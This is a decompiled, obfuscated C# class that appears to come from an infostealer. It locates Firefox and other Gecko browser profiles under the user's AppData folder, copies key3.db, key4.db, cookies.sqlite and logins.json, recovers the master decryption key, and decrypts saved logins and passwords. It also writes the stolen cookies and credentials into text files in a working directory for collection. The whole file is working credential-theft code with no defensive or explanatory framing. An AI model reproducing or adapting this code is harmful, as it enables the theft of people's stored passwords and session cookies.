using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.Models.JSON;
using who;
using who.Gecko;

// Token: 0x0200002E RID: 46
internal class Class18
{
	// Token: 0x06000170 RID: 368 RVA: 0x0000CD94 File Offset: 0x0000AF94
	public static List<string> smethod_0(string string_3, int int_0 = 4, int int_1 = 1, params string[] files)
	{
		List<string> list = new List<string>();
		List<string> result;
		if (files == null || files.Length == 0 || int_1 > int_0)
		{
			result = list;
		}
		else
		{
			try
			{
				string[] directories = Directory.GetDirectories(string_3);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						int num = 0;
						while (num < files2.Length && !flag)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in Class18.smethod_0(directoryInfo.FullName, int_0, int_1 + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
					}
					catch
					{
					}
				}
				result = list;
			}
			catch
			{
				result = list;
			}
		}
		return result;
	}

	// Token: 0x06000171 RID: 369 RVA: 0x0000CEE8 File Offset: 0x0000B0E8
	public static void smethod_1(string string_3, string string_4, string string_5)
	{
		try
		{
			if (File.Exists(Path.Combine(string_3, "key3.db")))
			{
				Class18.smethod_7(string_3, Class18.smethod_9(Class18.smethod_4(Path.Combine(string_3, "key3.db"))), string_4, string_5);
			}
			Class18.smethod_7(string_3, Class18.smethod_8(Class18.smethod_4(Path.Combine(string_3, "key4.db"))), string_4, string_5);
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000172 RID: 370 RVA: 0x0000CF58 File Offset: 0x0000B158
	public static void Cookies()
	{
		if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
		{
			Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
		}
		List<string> list = new List<string>();
		list.AddRange(Class18.smethod_0(Class18.string_0, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		list.AddRange(Class18.smethod_0(Class18.string_2, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		foreach (string text in list)
		{
			string fullName = new FileInfo(text).Directory.FullName;
			string string_ = text.Contains(Class18.string_2) ? Class18.smethod_12(fullName) : Class18.smethod_13(fullName);
			string string_2 = Class18.smethod_3(fullName);
			Class18.smethod_6(fullName, string_, string_2);
			string text2 = "";
			foreach (string str in Class18.list_1)
			{
				text2 += str;
			}
			if (text2 != "")
			{
				File.WriteAllText(Dirs.WorkDir + "\\Browsers\\Cookies_Gecko.txt", text2, Encoding.Default);
			}
		}
	}

	// Token: 0x06000173 RID: 371 RVA: 0x0000D104 File Offset: 0x0000B304
	public static void smethod_2()
	{
		if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
		{
			Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
		}
		List<string> list = new List<string>();
		list.AddRange(Class18.smethod_0(Class18.string_0, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		list.AddRange(Class18.smethod_0(Class18.string_2, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		foreach (string text in list)
		{
			string fullName = new FileInfo(text).Directory.FullName;
			string string_ = text.Contains(Class18.string_2) ? Class18.smethod_12(fullName) : Class18.smethod_13(fullName);
			string string_2 = Class18.smethod_3(fullName);
			Class18.smethod_1(fullName, string_, string_2);
		}
	}

	// Token: 0x06000174 RID: 372 RVA: 0x0000D230 File Offset: 0x0000B430
	private static string smethod_3(string string_3)
	{
		try
		{
			string[] array = string_3.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[array.Length - 1];
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x06000175 RID: 373 RVA: 0x0000D278 File Offset: 0x0000B478
	public static string smethod_4(string string_3)
	{
		string text = Class18.smethod_5();
		File.Copy(string_3, text, true);
		return text;
	}

	// Token: 0x06000176 RID: 374 RVA: 0x0000D298 File Offset: 0x0000B498
	public static string smethod_5()
	{
		return Path.Combine(Class18.string_1, string.Concat(new object[]
		{
			"tempDataBase",
			DateTime.Now.ToString("O").Replace(':', '_'),
			Thread.CurrentThread.GetHashCode(),
			Thread.CurrentThread.ManagedThreadId
		}));
	}

	// Token: 0x06000177 RID: 375 RVA: 0x0000D308 File Offset: 0x0000B508
	public static void smethod_6(string string_3, string string_4, string string_5)
	{
		try
		{
			string string_6 = Path.Combine(string_3, "cookies.sqlite");
			CNT cnt = new CNT(Class18.smethod_4(string_6));
			cnt.ReadTable("moz_cookies");
			for (int i = 0; i < cnt.RowLength; i++)
			{
				try
				{
					Class18.list_0.Add(cnt.ParseValue(i, "host").Trim());
					Class18.list_1.Add(string.Concat(new string[]
					{
						cnt.ParseValue(i, "host").Trim(),
						"\t",
						(cnt.ParseValue(i, "isSecure") == "1").ToString(),
						"\t",
						cnt.ParseValue(i, "path").Trim(),
						"\t",
						(cnt.ParseValue(i, "isSecure") == "1").ToString(),
						"\t",
						cnt.ParseValue(i, "expiry").Trim(),
						"\t",
						cnt.ParseValue(i, "name").Trim(),
						"\t",
						cnt.ParseValue(i, "value"),
						Environment.NewLine
					}));
					Class20.int_0++;
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000178 RID: 376 RVA: 0x0000D4B0 File Offset: 0x0000B6B0
	public static void smethod_7(string string_3, byte[] byte_1, string string_4, string string_5)
	{
		try
		{
			string path = Class18.smethod_4(Path.Combine(string_3, "logins.json"));
			if (File.Exists(path))
			{
				foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON()["logins"]))
				{
					JsonValue jsonValue = (JsonValue)obj;
					Class26.int_0++;
					Gecko4 gecko = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
					Gecko4 gecko2 = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
					string text = Regex.Replace(Gecko6.lTRjlt(byte_1, gecko.Objects[0].Objects[1].Objects[1].ObjectData, gecko.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(Gecko6.lTRjlt(byte_1, gecko2.Objects[0].Objects[1].Objects[1].ObjectData, gecko2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text3 = jsonValue["hostname"].ToString(true).Replace("\"", "").Replace("https://", "").Replace("http://", "").Replace("www.", "");
					Class26.string_0 = string.Concat(new string[]
					{
						Class26.string_0,
						Environment.NewLine,
						"Host: ",
						text3,
						Environment.NewLine,
						"Login: ",
						text,
						Environment.NewLine,
						"Password: ",
						text2,
						Environment.NewLine,
						"Soft: ",
						string_4,
						Environment.NewLine
					});
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000179 RID: 377 RVA: 0x0000D728 File Offset: 0x0000B928
	private static byte[] smethod_8(string string_3)
	{
		byte[] array = new byte[24];
		byte[] result;
		try
		{
			if (File.Exists(string_3))
			{
				CNT cnt = new CNT(string_3);
				cnt.ReadTable("metaData");
				string s = cnt.ParseValue(0, "item1");
				string s2 = cnt.ParseValue(0, "item2)");
				Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
				byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
				Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				gecko2.method_2();
				Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.None);
				cnt.ReadTable("nssPrivate");
				int rowLength = cnt.RowLength;
				string s3 = string.Empty;
				for (int i = 0; i < rowLength; i++)
				{
					if (cnt.ParseValue(i, "a102") == Encoding.Default.GetString(Class18.byte_0))
					{
						s3 = cnt.ParseValue(i, "a11");
						IL_152:
						Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
						objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
						objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
						gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
						gecko2.method_2();
						array = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
						return array;
					}
				}
				goto IL_152;
			}
			result = array;
		}
		catch (Exception)
		{
			result = array;
		}
		return result;
	}

	// Token: 0x0600017A RID: 378 RVA: 0x0000D960 File Offset: 0x0000BB60
	private static byte[] smethod_9(string string_3)
	{
		byte[] array = new byte[24];
		byte[] result;
		try
		{
			if (!File.Exists(string_3))
			{
				result = array;
			}
			else
			{
				new DataTable();
				Gecko9 gecko9_ = new Gecko9(string_3);
				Gecko7 gecko = new Gecko7(Class18.smethod_11(gecko9_, new Func<string, bool>(Class18.Class19.class19_0.method_0)));
				string string_4 = Class18.smethod_11(gecko9_, new Func<string, bool>(Class18.Class19.class19_0.method_1));
				Gecko8 gecko2 = new Gecko8(Class18.smethod_10(string_4), Encoding.Default.GetBytes(string.Empty), Class18.smethod_10(gecko.EntrySalt));
				gecko2.method_2();
				Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, Class18.smethod_10(gecko.Passwordcheck), PaddingMode.None);
				Gecko4 gecko3 = Gecko1.Create(Class18.smethod_10(Class18.smethod_11(gecko9_, new Func<string, bool>(Class18.Class19.class19_0.method_2))));
				Gecko8 gecko4 = new Gecko8(Class18.smethod_10(string_4), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
				gecko4.method_2();
				Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
				if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
				{
					array = gecko5.Objects[0].Objects[3].ObjectData;
					result = array;
				}
				else
				{
					Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
					result = array;
				}
			}
		}
		catch (Exception)
		{
			result = array;
		}
		return result;
	}

	// Token: 0x0600017B RID: 379 RVA: 0x0000DBD8 File Offset: 0x0000BDD8
	public static byte[] smethod_10(string string_3)
	{
		if (string_3.Length % 2 != 0)
		{
			throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", string_3));
		}
		byte[] array = new byte[string_3.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = string_3.Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		return array;
	}

	// Token: 0x0600017C RID: 380 RVA: 0x0000DC48 File Offset: 0x0000BE48
	private static string smethod_11(Gecko9 gecko9_0, Func<string, bool> func_0)
	{
		string text = string.Empty;
		try
		{
			foreach (KeyValuePair<string, string> keyValuePair in gecko9_0.Keys)
			{
				if (func_0(keyValuePair.Key))
				{
					text = keyValuePair.Value;
				}
			}
		}
		catch (Exception)
		{
		}
		return text.Replace("-", string.Empty);
	}

	// Token: 0x0600017D RID: 381 RVA: 0x0000DCD8 File Offset: 0x0000BED8
	private static string smethod_12(string string_3)
	{
		string text = string.Empty;
		try
		{
			string[] array = string_3.Split(new string[]
			{
				"AppData\\Roaming\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}

	// Token: 0x0600017E RID: 382 RVA: 0x0000DD54 File Offset: 0x0000BF54
	private static string smethod_13(string string_3)
	{
		string text = string.Empty;
		try
		{
			string[] array = string_3.Split(new string[]
			{
				"AppData\\Local\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}

	// Token: 0x0600017F RID: 383 RVA: 0x0000276F File Offset: 0x0000096F
	public Class18()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x06000180 RID: 384 RVA: 0x0000DDD0 File Offset: 0x0000BFD0
	// Note: this type is marked as 'beforefieldinit'.
	static Class18()
	{
		Class34.A1SfXVPz7w9eh();
		Class18.list_0 = new List<string>();
		Class18.list_1 = new List<string>();
		Class18.list_2 = new List<string>();
		Class18.list_3 = new List<string>();
		Class18.string_0 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
		Class18.string_1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");
		Class18.string_2 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
		Class18.byte_0 = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};
	}

	// Token: 0x04000097 RID: 151
	public static List<string> list_0;

	// Token: 0x04000098 RID: 152
	public static List<string> list_1;

	// Token: 0x04000099 RID: 153
	public static List<string> list_2;

	// Token: 0x0400009A RID: 154
	public static List<string> list_3;

	// Token: 0x0400009B RID: 155
	public static readonly string string_0;

	// Token: 0x0400009C RID: 156
	public static readonly string string_1;

	// Token: 0x0400009D RID: 157
	public static readonly string string_2;

	// Token: 0x0400009E RID: 158
	public static readonly byte[] byte_0;

	// Token: 0x0200002F RID: 47
	[CompilerGenerated]
	[Serializable]
	private sealed class Class19
	{
		// Token: 0x06000181 RID: 385 RVA: 0x00002AD2 File Offset: 0x00000CD2
		// Note: this type is marked as 'beforefieldinit'.
		static Class19()
		{
			Class34.A1SfXVPz7w9eh();
			Class18.Class19.class19_0 = new Class18.Class19();
		}

		// Token: 0x06000182 RID: 386 RVA: 0x0000276F File Offset: 0x0000096F
		public Class19()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x06000183 RID: 387 RVA: 0x00002AE3 File Offset: 0x00000CE3
		internal bool method_0(string string_0)
		{
			return string_0.Equals("password-check");
		}

		// Token: 0x06000184 RID: 388 RVA: 0x00002AF0 File Offset: 0x00000CF0
		internal bool method_1(string string_0)
		{
			return string_0.Equals("global-salt");
		}

		// Token: 0x06000185 RID: 389 RVA: 0x00002AFD File Offset: 0x00000CFD
		internal bool method_2(string string_0)
		{
			return !string_0.Equals("password-check") && !string_0.Equals("Version") && !string_0.Equals("global-salt");
		}

		// Token: 0x0400009F RID: 159
		public static readonly Class18.Class19 class19_0;

		// Token: 0x040000A0 RID: 160
		public static Func<string, bool> func_0;

		// Token: 0x040000A1 RID: 161
		public static Func<string, bool> func_1;

		// Token: 0x040000A2 RID: 162
		public static Func<string, bool> func_2;
	}
}
